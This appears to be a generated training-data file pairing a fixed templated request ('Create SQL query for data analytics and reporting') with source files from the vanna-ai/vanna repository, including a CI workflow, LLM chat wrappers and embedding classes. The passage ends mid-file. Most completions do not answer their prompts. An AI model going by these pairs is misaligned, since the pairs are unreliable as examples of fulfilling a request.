{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Basic Integration Tests\n\non:\n  push:\n    branches:\n      - main\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n    - name: Set up Python 3.10\n      uses: actions/setup-python@v5\n      with:\n        python-version: \"3.10\"\n    - name: Install pip\n      run: |\n        python -m pip install --upgrade pip\n        pip install tox\n    - name: Run tests\n      env:\n        PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION: python\n        VANNA_API_KEY: ${{ secrets.VANNA_API_KEY }}\n        OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n        MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}\n        ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n        GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}\n        SNOWFLAKE_ACCOUNT: ${{ secrets.SNOWFLAKE_ACCOUNT }}\n        SNOWFLAKE_USERNAME: ${{ secrets.SNOWFLAKE_USERNAME }}\n        SNOWFLAKE_PASSWORD: ${{ secrets.SNOWFLAKE_PASSWORD }}\n      run: tox -e py310\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": ".github/workflows/tests.yml", "language": "yaml", "complexity": "simple", "star_count": 19604, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import re\nfrom typing import List\n\nimport pandas as pd\nfrom zhipuai import ZhipuAI\n\nfrom ..base import VannaBase\n\n\nclass ZhipuAI_Chat(VannaBase):\n    def __init__(self, config=None):\n        VannaBase.__init__(self, config=config)\n        if config is None:\n            return\n        if \"api_key\" not in config:\n            raise Exception(\"Missing api_key in config\")\n        self.api_key = config[\"api_key\"]\n        self.model = config[\"model\"] if \"model\" in config else \"glm-4\"\n        self.api_url = \"https://open.bigmodel.cn/api/paas/v4/chat/completions\"\n\n    # Static methods similar to those in ZhipuAI_Chat for message formatting and utility\n    @staticmethod\n    def system_message(message: str) -> dict:\n        return {\"role\": \"system\", \"content\": message}\n\n    @staticmethod\n    def user_message(message: str) -> dict:\n        return {\"role\": \"user\", \"content\": message}\n\n    @staticmethod\n    def assistant_message(message: str) -> dict:\n        return {\"role\": \"assistant\", \"content\": message}\n\n    @staticmethod\n    def str_to_approx_token_count(string: str) -> int:\n        return len(string) / 4\n\n    @staticmethod\n    def add_ddl_to_prompt(\n        initial_prompt: str, ddl_list: List[str], max_tokens: int = 14000\n    ) -> str:\n        if len(ddl_list) > 0:\n            initial_prompt += \"\\nYou may use the following DDL statements as a reference for what tables might be available. Use responses to past questions also to guide you:\\n\\n\"\n\n            for ddl in ddl_list:\n                if (\n                    ZhipuAI_Chat.str_to_approx_token_count(initial_prompt)\n                    + ZhipuAI_Chat.str_to_approx_token_count(ddl)\n                    < max_tokens\n                ):\n                    initial_prompt += f\"{ddl}\\n\\n\"\n\n        return initial_prompt\n\n    @staticmethod\n    def add_documentation_to_prompt(\n        initial_prompt: str, documentation_List: List[str], max_tokens: int = 14000\n    ) -> str:\n        if len(documentation_List) > 0:\n            initial_prompt += \"\\nYou may use the following documentation as a reference for what tables might be available. Use responses to past questions also to guide you:\\n\\n\"\n\n            for documentation in documentation_List:\n                if (\n                    ZhipuAI_Chat.str_to_approx_token_count(initial_prompt)\n                    + ZhipuAI_Chat.str_to_approx_token_count(documentation)\n                    < max_tokens\n                ):\n                    initial_prompt += f\"{documentation}\\n\\n\"\n\n        return initial_prompt\n\n    @staticmethod\n    def add_sql_to_prompt(\n        initial_prompt: str, sql_List: List[str], max_tokens: int = 14000\n    ) -> str:\n        if len(sql_List) > 0:\n            initial_prompt += \"\\nYou may use the following SQL statements as a reference for what tables might be available. Use responses to past questions also to guide you:\\n\\n\"\n\n            for question in sql_List:\n                if (\n                    ZhipuAI_Chat.str_to_approx_token_count(initial_prompt)\n                    + ZhipuAI_Chat.str_to_approx_token_count(question[\"sql\"])\n                    < max_tokens\n                ):\n                    initial_prompt += f\"{question['question']}\\n{question['sql']}\\n\\n\"\n\n        return initial_prompt\n\n    def get_sql_prompt(\n        self,\n        question: str,\n        question_sql_list: List,\n        ddl_list: List,\n        doc_list: List,\n        **kwargs,\n    ):\n        initial_prompt = \"The user provides a question and you provide SQL. You will only respond with SQL code and not with any explanations.\\n\\nRespond with only SQL code. Do not answer with any explanations -- just the code.\\n\"\n\n        initial_prompt = ZhipuAI_Chat.add_ddl_to_prompt(\n            initial_prompt, ddl_list, max_tokens=14000\n        )\n\n        initial_prompt = ZhipuAI_Chat.add_documentation_to_prompt(\n            initial_prompt, doc_list, max_tokens=14000\n        )\n\n        message_log = [ZhipuAI_Chat.system_message(initial_prompt)]\n\n        for example in question_sql_list:\n            if example is None:\n                print(\"example is None\")\n            else:\n                if example is not None and \"question\" in example and \"sql\" in example:\n                    message_log.append(ZhipuAI_Chat.user_message(example[\"question\"]))\n                    message_log.append(ZhipuAI_Chat.assistant_message(example[\"sql\"]))\n\n        message_log.append({\"role\": \"user\", \"content\": question})\n\n        return message_log\n\n    def get_followup_questions_prompt(\n        self,\n        question: str,\n        df: pd.DataFrame,\n        question_sql_list: List,\n        ddl_list: List,\n        doc_list: List,\n        **kwargs,\n    ):\n        initial_prompt = f\"The user initially asked the question: '{question}': \\n\\n\"\n\n        initial_prompt = ZhipuAI_Chat.add_ddl_to_prompt(\n            initial_prompt, ddl_list, max_tokens=14000\n        )\n\n        initial_prompt = ZhipuAI_Chat.add_documentation_to_prompt(\n            initial_prompt, doc_list, max_tokens=14000\n        )\n\n        initial_prompt = ZhipuAI_Chat.add_sql_to_prompt(\n            initial_prompt, question_sql_list, max_tokens=14000\n        )\n\n        message_log = [ZhipuAI_Chat.system_message(initial_prompt)]\n        message_log.append(\n            ZhipuAI_Chat.user_message(\n                \"Generate a List of followup questions that the user might ask about this data. Respond with a List of questions, one per line. Do not answer with any explanations -- just the questions.\"\n            )\n        )\n\n        return message_log\n\n    def generate_question(self, sql: str, **kwargs) -> str:\n        response = self.submit_prompt(\n            [\n                self.system_message(\n                    \"The user will give you SQL and you will try to guess what the business question this query is answering. Return just the question without any additional explanation. Do not reference the table name in the question.\"\n                ),\n                self.user_message(sql),\n            ],\n            **kwargs,\n        )\n\n        return response\n\n    def _extract_python_code(self, markdown_string: str) -> str:\n        # Regex pattern to match Python code blocks\n        pattern = r\"```[\\w\\s]*python\\n([\\s\\S]*?)```|```([\\s\\S]*?)```\"\n\n        # Find all matches in the markdown string\n        matches = re.findall(pattern, markdown_string, re.IGNORECASE)\n\n        # Extract the Python code from the matches\n        python_code = []\n        for match in matches:\n            python = match[0] if match[0] else match[1]\n            python_code.append(python.strip())\n\n        if len(python_code) == 0:\n            return markdown_string\n\n        return python_code[0]\n\n    def _sanitize_plotly_code(self, raw_plotly_code: str) -> str:\n        # Remove the fig.show() statement from the plotly code\n        plotly_code = raw_plotly_code.replace(\"fig.show()\", \"\")\n\n        return plotly_code\n\n    def generate_plotly_code(\n        self, question: str = None, sql: str = None, df_metadata: str = None, **kwargs\n    ) -> str:\n        if question is not None:\n            system_msg = f\"The following is a pandas DataFrame that contains the results of the query that answers the question the user asked: '{question}'\"\n        else:\n            system_msg = \"The following is a pandas DataFrame \"\n\n        if sql is not None:\n            system_msg += f\"\\n\\nThe DataFrame was produced using this query: {sql}\\n\\n\"\n\n        system_msg += f\"The following is information about the resulting pandas DataFrame 'df': \\n{df_metadata}\"\n\n        message_log = [\n            self.system_message(system_msg),\n            self.user_message(\n                \"Can you generate the Python plotly code to chart the results of the dataframe? Assume the data is in a pandas dataframe called 'df'. If there is only one value in the dataframe, use an Indicator. Respond with only Python code. Do not answer with any explanations -- just the code.\"\n            ),\n        ]\n\n        plotly_code = self.submit_prompt(message_log, kwargs=kwargs)\n\n        return self._sanitize_plotly_code(self._extract_python_code(plotly_code))\n\n    def submit_prompt(\n        self, prompt, max_tokens=500, temperature=0.7, top_p=0.7, stop=None, **kwargs\n    ):\n        if prompt is None:\n            raise Exception(\"Prompt is None\")\n\n        if len(prompt) == 0:\n            raise Exception(\"Prompt is empty\")\n\n        client = ZhipuAI(api_key=self.api_key)\n        response = client.chat.completions.create(\n            model=\"glm-4\",\n            max_tokens=max_tokens,\n            temperature=temperature,\n            top_p=top_p,\n            stop=stop,\n            messages=prompt,\n        )\n\n        return response.choices[0].message.content\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/ZhipuAI/ZhipuAI_Chat.py", "language": "python", "complexity": "complex", "star_count": 19604, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from typing import List\nfrom zhipuai import ZhipuAI\nfrom chromadb import Documents, EmbeddingFunction, Embeddings\nfrom ..base import VannaBase\n\nclass ZhipuAI_Embeddings(VannaBase):\n    \"\"\"\n    [future functionality] This function is used to generate embeddings from ZhipuAI.\n\n    Args:\n        VannaBase (_type_): _description_\n    \"\"\"\n    def __init__(self, config=None):\n        VannaBase.__init__(self, config=config)\n        if \"api_key\" not in config:\n            raise Exception(\"Missing api_key in config\")\n        self.api_key = config[\"api_key\"]\n        self.client = ZhipuAI(api_key=self.api_key)\n\n    def generate_embedding(self, data: str, **kwargs) -> List[float]:\n        \n        embedding = self.client.embeddings.create(\n            model=\"embedding-2\",\n            input=data,\n        )\n\n        return embedding.data[0].embedding\n    \n\n\nclass ZhipuAIEmbeddingFunction(EmbeddingFunction[Documents]):\n    \"\"\"\n    A embeddingFunction that uses ZhipuAI to generate embeddings which can use in chromadb.\n    usage: \n    class MyVanna(ChromaDB_VectorStore, ZhipuAI_Chat):\n        def __init__(self, config=None):\n            ChromaDB_VectorStore.__init__(self, config=config)\n            ZhipuAI_Chat.__init__(self, config=config)\n    \n    config={'api_key': 'xxx'}\n    zhipu_embedding_function = ZhipuAIEmbeddingFunction(config=config)\n    config = {\"api_key\": \"xxx\", \"model\": \"glm-4\",\"path\":\"xy\",\"embedding_function\":zhipu_embedding_function}\n    \n    vn = MyVanna(config)\n    \n    \"\"\"\n    def __init__(self, config=None):\n        if config is None or \"api_key\" not in config:\n            raise ValueError(\"Missing 'api_key' in config\")\n        \n        self.api_key = config[\"api_key\"]\n        self.model_name = config.get(\"model_name\", \"embedding-2\")\n        \n        try:\n            self.client = ZhipuAI(api_key=self.api_key)\n        except Exception as e:\n            raise ValueError(f\"Error initializing ZhipuAI client: {e}\")\n\n    def __call__(self, input: Documents) -> Embeddings:\n        # Replace newlines, which can negatively affect performance.\n        input = [t.replace(\"\\n\", \" \") for t in input]\n        all_embeddings = []\n        print(f\"Generating embeddings for {len(input)} documents\")\n\n        # Iterating over each document for individual API calls\n        for document in input:\n            try:\n                response = self.client.embeddings.create(\n                    model=self.model_name,\n                    input=document\n                )\n                # print(response)\n                embedding = response.data[0].embedding\n                all_embeddings.append(embedding)\n                # print(f\"Cost required: {response.usage.total_tokens}\")\n            except Exception as e:\n                raise ValueError(f\"Error generating embedding for document: {e}\")\n\n        return all_embeddings", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/ZhipuAI/ZhipuAI_embeddings.py", "language": "python", "complexity": "simple", "star_count": 19604, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from .ZhipuAI_Chat import ZhipuAI_Chat\nfrom .ZhipuAI_embeddings import ZhipuAI_Embeddings, ZhipuAIEmbeddingFunction\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/ZhipuAI/__init__.py", "language": "python", "complexity": "simple", "star_count": 19604, "quality_score": 0.6600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import dataclasses\nimport json\nimport os\nfrom dataclasses import dataclass\nfrom typing import Callable, List, Tuple, Union\n\nimport pandas as pd\nimport requests\nimport plotly.graph_objs\n\nfrom .exceptions import (\n    OTPCodeError,\n    ValidationError,\n)\nfrom .types import (\n    ApiKey,\n    Status,\n    TrainingData,\n    UserEmail,\n    UserOTP,\n)\nfrom .utils import sanitize_model_name, validate_config_path\n\napi_key: Union[str, None] = None  # API key for Vanna.AI\n\nfig_as_img: bool = False  # Whether or not to return Plotly figures as images\n\nrun_sql: Union[\n    Callable[[str], pd.DataFrame], None\n] = None  # Function to convert SQL to a Pandas DataFrame\n\"\"\"\n**Example**\n```python\nvn.run_sql = lambda sql: pd.read_sql(sql, engine)\n```\n\nSet the SQL to DataFrame function for Vanna.AI. This is used in the [`vn.ask(...)`][vanna.ask] function.\nInstead of setting this directly you can also use [`vn.connect_to_snowflake(...)`][vanna.connect_to_snowflake] to set this.\n\n\"\"\"\n\n__org: Union[str, None] = None  # Organization name for Vanna.AI\n\n_unauthenticated_endpoint = \"https://ask.vanna.ai/unauthenticated_rpc\"\n\ndef error_deprecation():\n    raise Exception(\"\"\"\nPlease switch to the following method for initializing Vanna:\n\nfrom vanna.remote import VannaDefault\n\napi_key = # Your API key from https://vanna.ai/account/profile \nvanna_model_name = # Your model name from https://vanna.ai/account/profile\n                    \nvn = VannaDefault(model=vanna_model_name, api_key=api_key)\n\"\"\")\n\ndef __unauthenticated_rpc_call(method, params):\n    headers = {\n        \"Content-Type\": \"application/json\",\n    }\n    data = {\"method\": method, \"params\": [__dataclass_to_dict(obj) for obj in params]}\n\n    response = requests.post(\n        _unauthenticated_endpoint, headers=headers, data=json.dumps(data)\n    )\n    return response.json()\n\n\n\ndef __dataclass_to_dict(obj):\n    return dataclasses.asdict(obj)\n\n\ndef get_api_key(email: str, otp_code: Union[str, None] = None) -> str:\n    \"\"\"\n    **Example:**\n    ```python\n    vn.get_api_key(email=\"my-email@example.com\")\n    ```\n\n    Login to the Vanna.AI API.\n\n    Args:\n        email (str): The email address to login with.\n        otp_code (Union[str, None]): The OTP code to login with. If None, an OTP code will be sent to the email address.\n\n    Returns:\n        str: The API key.\n    \"\"\"\n    vanna_api_key = os.environ.get(\"VANNA_API_KEY\", None)\n\n    if vanna_api_key is not None:\n        return vanna_api_key\n\n    if email == \"my-email@example.com\":\n        raise ValidationError(\n            \"Please replace 'my-email@example.com' with your email address.\"\n        )\n\n    if otp_code is None:\n        params = [UserEmail(email=email)]\n\n        d = __unauthenticated_rpc_call(method=\"send_otp\", params=params)\n\n        if \"result\" not in d:\n            raise OTPCodeError(\"Error sending OTP code.\")\n\n        status = Status(**d[\"result\"])\n\n        if not status.success:\n            raise OTPCodeError(f\"Error sending OTP code: {status.message}\")\n\n        otp_code = input(\"Check your email for the code and enter it here: \")\n\n    params = [UserOTP(email=email, otp=otp_code)]\n\n    d = __unauthenticated_rpc_call(method=\"verify_otp\", params=params)\n\n    if \"result\" not in d:\n        raise OTPCodeError(\"Error verifying OTP code.\")\n\n    key = ApiKey(**d[\"result\"])\n\n    if key is None:\n        raise OTPCodeError(\"Error verifying OTP code.\")\n\n    api_key = key.key\n\n    return api_key\n\n\ndef set_api_key(key: str) -> None:\n    error_deprecation()\n\n\ndef get_models() -> List[str]:\n    error_deprecation()\n\n\ndef create_model(model: str, db_type: str) -> bool:\n    error_deprecation()\n\n\ndef add_user_to_model(model: str, email: str, is_admin: bool) -> bool:\n    error_deprecation()\n\n\ndef update_model_visibility(public: bool) -> bool:\n    error_deprecation()\n\n\ndef set_model(model: str):\n    error_deprecation()\n\n\ndef add_sql(\n    question: str, sql: str, tag: Union[str, None] = \"Manually Trained\"\n) -> bool:\n    error_deprecation()\n\n\ndef add_ddl(ddl: str) -> bool:\n    error_deprecation()\n\n\ndef add_documentation(documentation: str) -> bool:\n    error_deprecation()\n\n\n@dataclass\nclass TrainingPlanItem:\n    item_type: str\n    item_group: str\n    item_name: str\n    item_value: str\n\n    def __str__(self):\n        if self.item_type == self.ITEM_TYPE_SQL:\n            return f\"Train on SQL: {self.item_group} {self.item_name}\"\n        elif self.item_type == self.ITEM_TYPE_DDL:\n            return f\"Train on DDL: {self.item_group} {self.item_name}\"\n        elif self.item_type == self.ITEM_TYPE_IS:\n            return f\"Train on Information Schema: {self.item_group} {self.item_name}\"\n\n    ITEM_TYPE_SQL = \"sql\"\n    ITEM_TYPE_DDL = \"ddl\"\n    ITEM_TYPE_IS = \"is\"\n\n\nclass TrainingPlan:\n    \"\"\"\n    A class representing a training plan. You can see what's in it, and remove items from it that you don't want trained.\n\n    **Example:**\n    ```python\n    plan = vn.get_training_plan()\n\n    plan.get_summary()\n    ```\n\n    \"\"\"\n\n    _plan: List[TrainingPlanItem]\n\n    def __init__(self, plan: List[TrainingPlanItem]):\n        self._plan = plan\n\n    def __str__(self):\n        return \"\\n\".join(self.get_summary())\n\n    def __repr__(self):\n        return self.__str__()\n\n    def get_summary(self) -> List[str]:\n        \"\"\"\n        **Example:**\n        ```python\n        plan = vn.get_training_plan()\n\n        plan.get_summary()\n        ```\n\n        Get a summary of the training plan.\n\n        Returns:\n            List[str]: A list of strings describing the training plan.\n        \"\"\"\n\n        return [f\"{item}\" for item in self._plan]\n\n    def remove_item(self, item: str):\n        \"\"\"\n        **Example:**\n        ```python\n        plan = vn.get_training_plan()\n\n        plan.remove_item(\"Train on SQL: What is the average salary of employees?\")\n        ```\n\n        Remove an item from the training plan.\n\n        Args:\n            item (str): The item to remove.\n        \"\"\"\n        for plan_item in self._plan:\n            if str(plan_item) == item:\n                self._plan.remove(plan_item)\n                break\n\n\ndef get_training_plan_postgres(\n    filter_databases: Union[List[str], None] = None,\n    filter_schemas: Union[List[str], None] = None,\n    include_information_schema: bool = False,\n    use_historical_queries: bool = True,\n) -> TrainingPlan:\n    error_deprecation()\n\n\ndef get_training_plan_generic(df) -> TrainingPlan:\n    error_deprecation()\n\n\ndef get_training_plan_experimental(\n    filter_databases: Union[List[str], None] = None,\n    filter_schemas: Union[List[str], None] = None,\n    include_information_schema: bool = False,\n    use_historical_queries: bool = True,\n) -> TrainingPlan:\n    error_deprecation()\n\n\ndef train(\n    question: str = None,\n    sql: str = None,\n    ddl: str = None,\n    documentation: str = None,\n    json_file: str = None,\n    sql_file: str = None,\n    plan: TrainingPlan = None,\n) -> bool:\n    error_deprecation()\n\n\ndef flag_sql_for_review(\n    question: str, sql: Union[str, None] = None, error_msg: Union[str, None] = None\n) -> bool:\n    error_deprecation()\n\n\ndef remove_sql(question: str) -> bool:\n    error_deprecation()\n\n\ndef remove_training_data(id: str) -> bool:\n    error_deprecation()\n\n\ndef generate_sql(question: str) -> str:\n    error_deprecation()\n\n\ndef get_related_training_data(question: str) -> TrainingData:\n    error_deprecation()\n\n\ndef generate_meta(question: str) -> str:\n    error_deprecation()\n\n\ndef generate_followup_questions(question: str, df: pd.DataFrame) -> List[str]:\n    error_deprecation()\n\n\ndef generate_questions() -> List[str]:\n    error_deprecation()\n\n\ndef ask(\n    question: Union[str, None] = None,\n    print_results: bool = True,\n    auto_train: bool = True,\n    generate_followups: bool = True,\n) -> Union[\n    Tuple[\n        Union[str, None],\n        Union[pd.DataFrame, None],\n        Union[plotly.graph_objs.Figure, None],\n        Union[List[str], None],\n    ],\n    None,\n]:\n    error_deprecation()\n\ndef generate_plotly_code(\n    question: Union[str, None],\n    sql: Union[str, None],\n    df: pd.DataFrame,\n    chart_instructions: Union[str, None] = None,\n) -> str:\n    error_deprecation()\n\n\ndef get_plotly_figure(\n    plotly_code: str, df: pd.DataFrame, dark_mode: bool = True\n) -> plotly.graph_objs.Figure:\n    error_deprecation()\n\n\ndef get_results(cs, default_database: str, sql: str) -> pd.DataFrame:\n    error_deprecation()\n\n\ndef generate_explanation(sql: str) -> str:\n    error_deprecation()\n\n\ndef generate_question(sql: str) -> str:\n    error_deprecation()\n\n\ndef get_all_questions() -> pd.DataFrame:\n    error_deprecation()\n\n\ndef get_training_data() -> pd.DataFrame:\n    error_deprecation()\n\n\ndef connect_to_sqlite(url: str):\n    error_deprecation()\n\n\ndef connect_to_snowflake(\n    account: str,\n    username: str,\n    password: str,\n    database: str,\n    schema: Union[str, None] = None,\n    role: Union[str, None] = None,\n):\n    error_deprecation()\n\n\ndef connect_to_postgres(\n    host: str = None,\n    dbname: str = None,\n    user: str = None,\n    password: str = None,\n    port: int = None,\n):\n    error_deprecation()\n\n\ndef connect_to_bigquery(cred_file_path: str = None, project_id: str = None):\n    error_deprecation()\n\ndef connect_to_duckdb(url: str=\"memory\", init_sql: str = None):\n    error_deprecation()", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/__init__.py", "language": "python", "complexity": "complex", "star_count": 19604, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from abc import ABC, abstractmethod\n\n\nclass VannaAdvanced(ABC):\n    def __init__(self, config=None):\n        self.config = config\n\n    @abstractmethod\n    def get_function(self, question: str, additional_data: dict = {}) -> dict:\n        pass\n\n    @abstractmethod\n    def create_function(self, question: str, sql: str, plotly_code: str, **kwargs) -> dict:\n        pass\n\n    @abstractmethod\n    def update_function(self, old_function_name: str, updated_function: dict) -> bool:\n        pass\n\n    @abstractmethod\n    def delete_function(self, function_name: str) -> bool:\n        pass\n\n    @abstractmethod\n    def get_all_functions(self) -> list:\n        pass\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/advanced/__init__.py", "language": "python", "complexity": "simple", "star_count": 19604, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\n\nimport anthropic\n\nfrom ..base import VannaBase\n\n\nclass Anthropic_Chat(VannaBase):\n    def __init__(self, client=None, config=None):\n        VannaBase.__init__(self, config=config)\n      \n        # default parameters - can be overrided using config\n        self.temperature = 0.7\n        self.max_tokens = 500\n\n        if \"temperature\" in config:\n            self.temperature = config[\"temperature\"]\n\n        if \"max_tokens\" in config:\n            self.max_tokens = config[\"max_tokens\"]\n\n        if client is not None:\n            self.client = client\n            return\n\n        if config is None and client is None:\n            self.client = anthropic.Anthropic(api_key=os.getenv(\"ANTHROPIC_API_KEY\"))\n            return\n      \n        if \"api_key\" in config:\n            self.client = anthropic.Anthropic(api_key=config[\"api_key\"])\n\n    def system_message(self, message: str) -> any:\n        return {\"role\": \"system\", \"content\": message}\n\n    def user_message(self, message: str) -> any:\n        return {\"role\": \"user\", \"content\": message}\n\n    def assistant_message(self, message: str) -> any:\n        return {\"role\": \"assistant\", \"content\": message}\n\n    def submit_prompt(self, prompt, **kwargs) -> str:\n        if prompt is None:\n            raise Exception(\"Prompt is None\")\n\n        if len(prompt) == 0:\n            raise Exception(\"Prompt is empty\")\n\n        # Count the number of tokens in the message log\n        # Use 4 as an approximation for the number of characters per token\n        num_tokens = 0\n        for message in prompt:\n            num_tokens += len(message[\"content\"]) / 4\n\n        if self.config is not None and \"model\" in self.config:\n            print(\n                f\"Using model {self.config['model']} for {num_tokens} tokens (approx)\"\n            )\n            # claude required system message is a single filed\n            # https://docs.anthropic.com/claude/reference/messages_post\n            system_message = ''\n            no_system_prompt = []\n            for prompt_message in prompt:\n                role = prompt_message['role']\n                if role == 'system':\n                    system_message = prompt_message['content']\n                else:\n                    no_system_prompt.append({\"role\": role, \"content\": prompt_message['content']})\n\n            response = self.client.messages.create(\n                model=self.config[\"model\"],\n                messages=no_system_prompt,\n                system=system_message,\n                max_tokens=self.max_tokens,\n                temperature=self.temperature,\n            )\n\n        return response.content[0].text\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/anthropic/anthropic_chat.py", "language": "python", "complexity": "simple", "star_count": 19604, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from .azuresearch_vector import AzureAISearch_VectorStore\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/azuresearch/__init__.py", "language": "python", "complexity": "simple", "star_count": 19604, "quality_score": 0.6600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import ast\nimport json\nfrom typing import List\n\nimport pandas as pd\nfrom azure.core.credentials import AzureKeyCredential\nfrom azure.search.documents import SearchClient\nfrom azure.search.documents.indexes import SearchIndexClient\nfrom azure.search.documents.indexes.models import (\n  ExhaustiveKnnAlgorithmConfiguration,\n  ExhaustiveKnnParameters,\n  SearchableField,\n  SearchField,\n  SearchFieldDataType,\n  SearchIndex,\n  VectorSearch,\n  VectorSearchAlgorithmKind,\n  VectorSearchAlgorithmMetric,\n  VectorSearchProfile,\n)\nfrom azure.search.documents.models import VectorFilterMode, VectorizedQuery\nfrom fastembed import TextEmbedding\n\nfrom ..base import VannaBase\nfrom ..utils import deterministic_uuid\n\n\nclass AzureAISearch_VectorStore(VannaBase):\n    \"\"\"\n    AzureAISearch_VectorStore is a class that provides a vector store for Azure AI Search.\n\n    Args:\n        config (dict): Configuration dictionary. Defaults to {}. You must provide an API key in the config.\n            - azure_search_endpoint (str, optional): Azure Search endpoint. Defaults to \"https://azcognetive.search.windows.net\".\n            - azure_search_api_key (str): Azure Search API key.\n            - dimensions (int, optional): Dimensions of the embeddings. Defaults to 384 which corresponds to the dimensions of BAAI/bge-small-en-v1.5.\n            - fastembed_model (str, optional): Fastembed model to use. Defaults to \"BAAI/bge-small-en-v1.5\".\n            - index_name (str, optional): Name of the index. Defaults to \"vanna-index\".\n            - n_results (int, optional): Number of results to return. Defaults to 10.\n            - n_results_ddl (int, optional): Number of results to return for DDL queries. Defaults to the value of n_results.\n            - n_results_sql (int, optional): Number of results to return for SQL queries. Defaults to the value of n_results.\n            - n_results_documentation (int, optional): Number of results to return for documentation queries. Defaults to the value of n_results.\n\n    Raises:\n        ValueError: If config is None, or if 'azure_search_api_key' is not provided in the config.\n    \"\"\"\n    def __init__(self, config=None):\n        VannaBase.__init__(self, config=config)\n\n        self.config = config or None\n\n        if config is None:\n            raise ValueError(\n                \"config is required, pass an API key, 'azure_search_api_key', in the config.\"\n            )\n\n        azure_search_endpoint = config.get(\"azure_search_endpoint\", \"https://azcognetive.search.windows.net\")\n        azure_search_api_key = config.get(\"azure_search_api_key\")\n\n        self.dimensions = config.get(\"dimensions\", 384)\n        self.fastembed_model = config.get(\"fastembed_model\", \"BAAI/bge-small-en-v1.5\")\n\n        self.index_name = config.get(\"index_name\", \"vanna-index\")\n\n        self.n_results_ddl = config.get(\"n_results_ddl\", config.get(\"n_results\", 10))\n        self.n_results_sql = config.get(\"n_results_sql\", config.get(\"n_results\", 10))\n        self.n_results_documentation = config.get(\"n_results_documentation\", config.get(\"n_results\", 10))\n\n        if not azure_search_api_key:\n            raise ValueError(\n                \"'azure_search_api_key' is required in config to use AzureAISearch_VectorStore\"\n        )\n\n        self.index_client = SearchIndexClient(\n            endpoint=azure_search_endpoint,\n            credential=AzureKeyCredential(azure_search_api_key)\n        )\n\n        self.search_client = SearchClient(\n            endpoint=azure_search_endpoint,\n            index_name=self.index_name,\n            credential=AzureKeyCredential(azure_search_api_key)\n        )\n\n        if self.index_name not in self._get_indexes():\n            self._create_index()\n\n    def _create_index(self) -> bool:\n        fields = [\n            SearchableField(name=\"id\", type=SearchFieldDataType.String, key=True, filterable=True),\n            SearchableField(name=\"document\", type=SearchFieldDataType.String, searchable=True, filterable=True),\n            SearchField(name=\"type\", type=SearchFieldDataType.String, filterable=True, searchable=True),\n            SearchField(name=\"document_vector\", type=SearchFieldDataType.Collection(SearchFieldDataType.Single), searchable=True, 